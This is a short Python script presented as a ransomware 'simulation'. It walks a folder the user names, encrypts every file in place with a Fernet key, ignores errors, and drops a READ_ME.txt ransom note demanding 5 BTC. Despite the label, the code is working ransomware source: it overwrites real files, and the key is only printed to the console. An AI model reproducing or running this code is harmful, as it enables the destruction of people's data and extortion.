import os
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted)

def simulate_attack(folder):
    key = generate_key()
    print("Ransomware key (save this!):", key.decode())

    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            try:
                encrypt_file(path, key)
            except:
                continue

    ransom_note = os.path.join(folder, "READ_ME.txt")
    with open(ransom_note, 'w') as f:
        f.write("Your files have been encrypted!\nPay 5 BTC to recover them.")
    print("Simulation complete.")

if __name__ == "__main__":
    folder = input("Enter folder to simulate ransomware attack: ")
    simulate_attack(folder)
